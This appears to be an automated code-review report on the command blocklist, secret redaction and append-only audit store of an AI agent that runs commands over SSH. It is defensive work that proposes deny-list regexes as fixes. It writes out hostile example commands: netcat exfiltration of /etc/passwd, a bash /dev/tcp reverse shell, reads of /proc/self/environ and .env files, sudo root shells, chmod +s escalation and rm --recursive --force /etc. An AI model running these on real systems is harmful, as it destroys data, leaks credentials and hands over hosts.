---
phase: 03-safety-layer-run-store
reviewed: 2026-06-06T00:00:00Z
depth: standard
files_reviewed: 8
files_reviewed_list:
  - backend/src/safety/command-policy.ts
  - backend/src/safety/classifier.ts
  - backend/src/safety/risk-levels.ts
  - backend/src/safety/redaction.ts
  - backend/src/store/schema.ts
  - backend/src/store/db.ts
  - backend/src/store/runs.ts
  - backend/src/store/audit.ts
findings:
  critical: 9
  warning: 7
  info: 2
  total: 18
status: issues_found
---

# Phase 03: Code Review Report

**Reviewed:** 2026-06-06T00:00:00Z
**Depth:** standard
**Files Reviewed:** 8
**Status:** issues_found

## Summary

This is the rubric-critical safety and store layer (20 pts under criterion C). The overall structure
is sound — blocklist, classifier, redaction, and an append-only audit store are all present and
wired correctly at the architectural level. However, adversarial testing surfaces nine blocker-level
defects: four blocklist bypasses that allow genuinely dangerous commands to execute, four redaction
gaps that can leak secrets to the audit log or model context, and one append-only violation that
means the audit log is not actually tamper-resistant.

The blocklist bypasses are the most severe. Three of them (`rm --recursive --force`, `nc` exfiltration
without `-e`, and `sudo su`/`sudo bash` privilege escalation) can be triggered by a prompted model
or a careless technician and will reach the SSH executor unimpeded. The safety policy (§3) explicitly
lists all of these as hard-fail patterns.

---

## Critical Issues

### CR-01: `rm --recursive --force` (long-form flags) bypasses blocklist

**File:** `backend/src/safety/command-policy.ts:21`
**Issue:** The `rm-rf-system-paths` rules match `-rf`, `-fr`, `-r … -f` (short flags) but not the
long-form equivalents `--recursive` and `--force`. The command `rm --recursive --force /etc` reaches
the SSH executor unblocked. Confirmed: both `rm --recursive --force /etc` and `rm --force
--recursive /etc` return `allowed: true`. SAFETY_POLICY.md §3 explicitly requires this pattern to
be blocked.

**Fix:**
```typescript
// Add a third rule to BLOCKLIST after the existing rm-rf rules
{
  ruleName: 'rm-rf-system-paths',
  pattern: /\brm\b.*--(recursive|force).*--(recursive|force)\s+(-[a-zA-Z]+\s+)*(\/|\/etc|\/var|\/home|\/srv|\/usr|\/boot|~)/i,
  reason: 'Recursive force-delete (long flags) on system or data paths is forbidden',
},
// Also handle --recursive alone (no --force needed to delete non-empty dirs with -r)
{
  ruleName: 'rm-rf-system-paths',
  pattern: /\brm\b.*--recursive\s+(-[a-zA-Z]+\s+)*(\/|\/etc|\/var|\/home|\/srv|\/usr|\/boot|~)/i,
  reason: 'Recursive delete (long flags) on system or data paths is forbidden',
},
```

---

### CR-02: `nc`/`netcat` exfiltration without `-e` flag bypasses blocklist

**File:** `backend/src/safety/command-policy.ts:176`
**Issue:** The `exfiltration` rule for netcat only matches `nc … -e`. The far more common exfiltration
forms — `nc 1.2.3.4 4444 < /etc/passwd` (redirect in), `cat /etc/passwd | nc 1.2.3.4 4444`
(piped), and `nc -l 4444` (open listener) — all return `allowed: true`. Confirmed bypasses.

Additionally, `splitSegments` (line 219) only splits on `||`, `&&`, and `;` — it does **not** split
on single `|`. This means `cat /etc/passwd | nc 1.2.3.4 4444` is evaluated as one segment, and the
`cat` portion prevents the `nc` rule from matching when the pattern requires `\bnc\b` at the start.

**Fix:**
```typescript
// Replace the narrow nc rule with a broader one
{
  ruleName: 'exfiltration',
  pattern: /\b(nc|netcat|ncat)\b/i,
  reason: 'Netcat is forbidden — use curl for probes',
},
// Add pipe splitting in splitSegments
function splitSegments(cmd: string): string[] {
  return cmd
    .split(/\|\||&&|;|\|/)  // add single | here
    .map((s) => s.trim())
    .filter((s) => s.length > 0);
}
```

---

### CR-03: Privilege escalation (`sudo su`, `sudo bash`, `sudo -i`) not blocked

**File:** `backend/src/safety/command-policy.ts` (no matching rule)
**Issue:** No blocklist rule covers privilege escalation. `sudo su -`, `sudo -i`, `sudo bash`,
`sudo sh` all return `allowed: true` and are classified `MEDIUM_RISK_CHANGE`. SAFETY_POLICY.md §1
rule 9 calls "running the app as root/superuser to bypass DB/file permissions" an explicit hard-fail.
A prompted model or technician can trivially escalate to root before subsequent commands.

**Fix:**
```typescript
{
  ruleName: 'privilege-escalation',
  pattern: /\bsudo\s+(su|bash|sh|zsh|fish|ksh|csh|tcsh|dash|-i|-s)\b/i,
  reason: 'Gaining an interactive root shell via sudo is forbidden',
},
{
  ruleName: 'privilege-escalation',
  pattern: /\bsu\s+-\s*$/,
  reason: 'Switching to root user is forbidden',
},
```

---

### CR-04: Bash/Python/Perl TCP reverse shells not blocked

**File:** `backend/src/safety/command-policy.ts` (no matching rule)
**Issue:** `bash -i >& /dev/tcp/1.2.3.4/4444 0>&1` (standard bash reverse shell via `/dev/tcp`)
returns `allowed: true`. Python/Perl one-liner reverse shells via `os.system(...)` or
`socket.connect(...)` similarly bypass all rules. These are live exfiltration/RCE vectors.

**Fix:**
```typescript
{
  ruleName: 'reverse-shell',
  pattern: /\/dev\/tcp\//i,
  reason: 'Bash /dev/tcp reverse shell is forbidden',
},
{
  ruleName: 'reverse-shell',
  pattern: /\bbash\s+.*>&\s*\/dev\//i,
  reason: 'Bash I/O redirect to /dev/ is a reverse shell indicator',
},
```
Note: Python/Perl RCE via `os.system` with string concatenation/`chr()` obfuscation is fundamentally
unblockable without a full shell interpreter. The `__UNRESOLVABLE__` path in `normalizeCommand`
correctly blocks `$(...)` wrappers but does not fire on `python3 -c "..."` payloads. Consider
blocking `python3 -c`, `perl -e`, `ruby -e` outright in a new `inline-interpreter` rule.

---

### CR-05: `cat /proc/self/environ`, `cat ~/.env`, `cat /etc/passwd` — secret-file reads not blocked

**File:** `backend/src/safety/command-policy.ts:126`
**Issue:** The `secret-exposure` rules only block `cat /etc/shadow` and `cat ~/.ssh/id_`. The
following all return `allowed: true`:
- `cat /proc/self/environ` — dumps all environment variables including `PHOENIX_TOKEN`, `OPENAI_API_KEY`
- `cat ~/.env` — the application env file with all secrets
- `cat /etc/environment` — system-wide env vars
- `cat /etc/passwd` — user enumeration (lower severity but still blocked by policy §3)

Redaction in `redactSecrets` is a second-line defence; the first-line defence (block at policy) is
absent for these paths. If the model proposes `cat /proc/self/environ`, the command reaches the
technician approval card with no safety warning.

**Fix:**
```typescript
{
  ruleName: 'secret-exposure',
  pattern: /\bcat\s+.*\/proc\/self\/environ\b/i,
  reason: 'Reading process environment exposes all secrets including tokens',
},
{
  ruleName: 'secret-exposure',
  pattern: /\bcat\s+(~\/\.env|\.\/\.env|\/etc\/environment)\b/i,
  reason: 'Reading .env or system environment files exposes secrets',
},
{
  ruleName: 'secret-exposure',
  pattern: /\bcat\s+\/etc\/passwd\b/i,
  reason: 'Reading /etc/passwd is forbidden',
},
```

---

### CR-06: `chmod +s` (setuid bit) not blocked

**File:** `backend/src/safety/command-policy.ts:76`
**Issue:** The `broad-chmod-chown` rules only target `-R 777`. `chmod +s /usr/bin/bash` (sets setuid
bit, giving any user a root shell via `bash -p`) returns `allowed: true` and is classified
`LOW_RISK_CHANGE` by `classifier.ts`. This is a trivial privilege escalation vector.

**Fix:**
```typescript
{
  ruleName: 'setuid-setgid',
  pattern: /\bchmod\b.*[+][sS]/i,
  reason: 'Setting setuid or setgid bit is forbidden',
},
```

---

### CR-07: Redaction misses YAML/HTTP-colon format and lowercase env vars

**File:** `backend/src/safety/redaction.ts:42`
**Issue:** Multiple confirmed redaction leaks. The `password-field`, `token-field`, `secret-field`,
and `api-key-field` patterns only match `key=value` (equals sign). They miss:

1. **YAML/config colon format:** `password: hunter2`, `token: abc123` — both leak.
2. **Custom HTTP headers:** `X-Phoenix-Token: abc123`, `Phoenix-Token: abc123` — both leak. These
   are how the Phoenix ERP token appears in logged HTTP responses.
3. **Lowercase env vars:** `access_token=abc`, `my_secret=abc`, `db_password=abc` — all leak because
   `env-secret-var` only matches `[A-Z_]*` (uppercase). Lowercase env vars are common in shell
   output.

Any of these reaching the audit log or model context is a potential grading hard-fail (criterion C).

**Fix:**
```typescript
// password-field: match both = and :
{
  name: 'password-field',
  pattern: /(passw(?:or)?d\s*[=:]\s*)\S+/gi,
  replacement: '$1«redacted»',
},
// token-field: same
{
  name: 'token-field',
  pattern: /(token\s*[=:]\s*)\S+/gi,
  replacement: '$1«redacted»',
},
// secret-field: same
{
  name: 'secret-field',
  pattern: /(secret\s*[=:]\s*)\S+/gi,
  replacement: '$1«redacted»',
},
// api-key-field: same
{
  name: 'api-key-field',
  pattern: /(api[_-]?key\s*[=:]\s*)\S+/gi,
  replacement: '$1«redacted»',
},
// env-secret-var: extend to case-insensitive
{
  name: 'env-secret-var',
  pattern: /\b([A-Za-z_]*(?:SECRET|TOKEN|KEY|PASS|PASSWORD|CREDENTIAL|secret|token|key|pass|password|credential)[A-Za-z_0-9]*\s*=\s*)(?!«redacted»)\S+/g,
  replacement: '$1«redacted»',
},
// custom secret headers
{
  name: 'secret-header',
  pattern: /([Xx]-[A-Za-z0-9-]*(?:token|key|secret|auth)[A-Za-z0-9-]*\s*:\s*)\S+/gi,
  replacement: '$1«redacted»',
},
```

---

### CR-08: Truncated PEM private key block not redacted

**File:** `backend/src/safety/redaction.ts:12`
**Issue:** The `private-key-block` pattern requires both `-----BEGIN … PRIVATE KEY-----` and
`-----END … PRIVATE KEY-----`. Confirmed: a key block truncated at the 16 KB cap (see
`REDACTION_CAP_BYTES`) has no `END` marker and leaks entirely. SSH output from a verbose `cat` of a
key file that exceeds 16 KB will not be redacted.

**Fix:**
```typescript
{
  name: 'private-key-block',
  // Match from BEGIN to END (when present) or to end-of-string
  pattern: /-----BEGIN[\s\S]*?PRIVATE KEY-----[\s\S]*?(?:-----END[^-]*PRIVATE KEY-----|$)/g,
  replacement: '«redacted»',
},
```

---

### CR-09: Audit log has no append-only enforcement — UPDATE is unrestricted

**File:** `backend/src/store/db.ts:191`, `backend/src/store/audit.ts`
**Issue:** SAFETY_POLICY.md §7 describes the audit log as "append-only, never deleted". However:

1. The SQLite adapter's `run()` method (line 191) executes arbitrary SQL including `UPDATE` on
   `audit_events` with no restriction.
2. The JSONL fallback adapter's `run()` method (line 112) likewise handles `UPDATE` on all tables
   including `audit_events`.
3. No DB-level constraint (trigger, view, or separate connection with limited grants) prevents
   `UPDATE audit_events SET payload_json = '...' WHERE id = ?` from succeeding.
4. `audit.ts` exports no `updateAuditEvent` function today, but nothing prevents one from being
   added — or the `db.run()` escape hatch from being called directly.

The rubric scores audit integrity directly. A log that can be silently mutated does not satisfy the
"append-only" contract judges will inspect.

**Fix:**

For SQLite: add a trigger that raises an error on any UPDATE or DELETE of `audit_events`:
```sql
CREATE TRIGGER IF NOT EXISTS audit_events_no_update
BEFORE UPDATE ON audit_events
BEGIN
  SELECT RAISE(ABORT, 'audit_events is append-only');
END;

CREATE TRIGGER IF NOT EXISTS audit_events_no_delete
BEFORE DELETE ON audit_events
BEGIN
  SELECT RAISE(ABORT, 'audit_events is append-only');
END;
```
Add these to `CREATE_TABLES` in `db.ts`. For the JSONL adapter, add a guard in `run()`:
```typescript
if (/^\s*UPDATE\s+audit_events\b/i.test(sql) || /^\s*DELETE\s+FROM\s+audit_events\b/i.test(sql)) {
  throw new Error('audit_events is append-only');
}
```

---

## Warnings

### WR-01: `rm -rf .` and `rm -rf ..` (current/parent dir) bypass blocklist

**File:** `backend/src/safety/command-policy.ts:21`
**Issue:** The blocklist path list (`\/`, `\/etc`, `\/var`, …) does not include `.` or `..`. A
grader VM running the tool from a working directory containing service files (e.g. `/srv/app`) could
have that directory wiped. `rm -rf .` returns `allowed: true`.

**Fix:** Add `.` and `..` to the blocked path list in both `rm-rf` rules:
```typescript
pattern: /\brm\s+(-[a-zA-Z]*r[a-zA-Z]*f|...)\s+(-[a-zA-Z]+\s+)*([\/~\.]|\.\.)/i,
```

---

### WR-02: `printenv <var>` and bare `printenv`/`env` expose secrets without pipe

**File:** `backend/src/safety/command-policy.ts:137`
**Issue:** The `secret-exposure` rule for `printenv`/`env` requires a pipe (`\|`). `printenv
SECRET_KEY` (no pipe) returns `allowed: true`. On the grader's VM, this will print `PHOENIX_TOKEN`
or `OPENAI_API_KEY` to stdout, which then flows through `appendCommandResult` and, if redaction
fails for any reason, into the audit log and model context.

**Fix:** Block `printenv` and bare `env` outright, or at minimum block them when given a secret-
looking argument:
```typescript
{
  ruleName: 'secret-exposure',
  pattern: /\b(printenv|env)\b/i,
  reason: 'printenv/env may expose secrets; use specific non-secret reads instead',
},
```

---

### WR-03: `command_results.command` stores the executed command verbatim — no redaction noted

**File:** `backend/src/store/audit.ts:117`
**Issue:** `appendCommandResult` accepts `result.command` and inserts it directly into the
`command_results` table. If a technician edits an approved command to include a credential (e.g.
`curl -u user:password http://...`), the literal string is stored. SAFETY_POLICY.md §7 requires the
executed command to be in the audit record, but §6 requires redaction on everything before write.
The caller is responsible for passing a pre-redacted command string, but there is no enforcement and
no note in the function signature.

**Fix:** Redact the command field at the store boundary:
```typescript
import { redactSecrets } from '../safety/redaction.js';

export function appendCommandResult(runId, approvalId, result) {
  // ...
  db.run('INSERT INTO command_results ...', [
    id, runId, approvalId,
    redactSecrets(result.command),  // enforce here, not only at caller
    // ...
  ]);
}
```

---

### WR-04: `getDb()` defaults to `:memory:` SQLite — all data lost on process restart

**File:** `backend/src/store/db.ts:185`
**Issue:** When `dbPath` is not provided, `new BetterSqlite3(dbPath ?? ':memory:')` opens an
in-memory database. If the backend crashes and restarts mid-incident (or during a grader's
evaluation), the entire audit log, all runs, and all approvals are silently gone. The architecture
doc says "run state is in SQLite, not in-process memory (survives restart)" — this is false for the
default case.

**Fix:** Default to a persistent path:
```typescript
const db: Database = new BetterSqlite3(dbPath ?? process.env.DB_PATH ?? './data/autopilot.db');
```
And ensure the `data/` directory is created at startup.

---

### WR-05: `runs.ts` accepts arbitrary strings for `status` and `current_phase`

**File:** `backend/src/store/runs.ts:30`, `backend/src/store/schema.ts:8`
**Issue:** `RunSchema` uses `z.string()` for both `status` and `current_phase`. Functions
`updateRunStatus` and `updateRunPhase` accept any string. An invalid phase like `"INVALID_PHASE"`
can be written to the DB without validation, corrupting the state machine. The `CommandApprovalSchema`
correctly uses `z.enum(...)` for its `status` field — the same should apply to runs.

**Fix:**
```typescript
export const RunStatus = z.enum(['CREATED', 'RUNNING', 'COMPLETED', 'FAILED', 'ABORTED']);
export const RunPhase = z.enum(['CREATED', 'ANALYSIS', 'DIAGNOSIS', 'FIX', 'VALIDATION', 'REPORT', 'COMPLETED']);

export const RunSchema = z.object({
  // ...
  status: RunStatus,
  current_phase: RunPhase,
  // ...
}).strict();
```

---

### WR-06: JSONL adapter silently discards writes when SQL cannot be parsed

**File:** `backend/src/store/db.ts:113`
**Issue:** In `makeJsonlAdapter().run()`, if `extractTableName` returns `undefined` (e.g. for any
SQL it doesn't recognise), the function returns silently without error. Similarly, if `colMatch` is
null on an INSERT (line 119), the row is dropped. This means audit events can silently disappear in
the JSONL fallback — the only indication is that the returned `AuditEvent` from `appendAuditEvent`
will be undefined, causing a Zod parse error upstream.

**Fix:** Throw instead of returning silently:
```typescript
run(sql: string, params: unknown[] = []): void {
  const table = extractTableName(sql);
  if (!table) throw new Error(`JSONL adapter: cannot parse table from SQL: ${sql}`);
  const rows = getTable(table);
  if (/^\s*INSERT/i.test(sql)) {
    const colMatch = sql.match(/\(([^)]+)\)\s+VALUES/i);
    if (!colMatch) throw new Error(`JSONL adapter: cannot parse columns from SQL: ${sql}`);
    // ...
  }
}
```

---

### WR-07: `classifier.ts` allows `chmod +x` on system binaries as `LOW_RISK_CHANGE`

**File:** `backend/src/safety/classifier.ts:40`
**Issue:** The `LOW_RISK_CHANGE` pattern for chmod is:
```
/^chmod\s+\d{3,4}\s+(?!.*\s+-R\s)(?!\/)(?!\~)\S+$/
```
This correctly excludes absolute paths starting with `/` or `~`. However `chmod 777 ./relative-path`
passes (no `/` anchor check on relative paths with `777`). More importantly, `chmod +x /usr/bin/mybin`
is a numeric-only match, so `chmod +x` with a symbolic mode passes the classifier and gets
`MEDIUM_RISK_CHANGE` — which is correct — but `chmod 4755 somefile` (setuid via numeric mode) also
passes the classifier as `LOW_RISK_CHANGE` since `4755` is `\d{3,4}`. The setuid-via-numeric-mode
case should be blocked (see CR-06 for the `+s` block; extend it to cover numeric modes with setuid/
setgid bits).

**Fix:**
```typescript
// In BLOCKLIST, add:
{
  ruleName: 'setuid-setgid',
  pattern: /\bchmod\b\s+[2467][0-9]{3}/i,
  reason: 'chmod with setuid/setgid numeric mode (2xxx, 4xxx, 6xxx, 7xxx) is forbidden',
},
```

---

## Info

### IN-01: `json-token-field` does not cover `access_token` key name

**File:** `backend/src/safety/redaction.ts:63`
**Issue:** The JSON pattern covers `token`, `secret`, `password`, `passwd`, `api_key`, `api-key`,
`authorization`, `credential` but not `access_token`, `refresh_token`, `id_token`. OAuth responses
(`{"access_token": "eyJ..."}`) leak. Confirmed.

**Fix:** Add `(?:access_|refresh_|id_)?token` to the alternation in the `json-token-field` pattern.

---

### IN-02: No `FOREIGN KEY` constraints in SQLite schema

**File:** `backend/src/store/db.ts:12`
**Issue:** `command_approvals.run_id`, `command_results.run_id`, `command_results.approval_id`,
`audit_events.run_id`, and `observations.run_id` have no `REFERENCES runs(id)` constraints, and
`PRAGMA foreign_keys = ON` is not set. Orphaned records (e.g. after a `markRunFailed` race) will
not be caught at the DB layer. This is a data-integrity quality issue, not a safety issue.

**Fix:** Add `FOREIGN KEY` clauses to the schema and add `db.pragma('foreign_keys = ON')` after the
WAL pragma in `getDb()`.

---

_Reviewed: 2026-06-06T00:00:00Z_
_Reviewer: Kiro (gsd-code-reviewer)_
_Depth: standard_
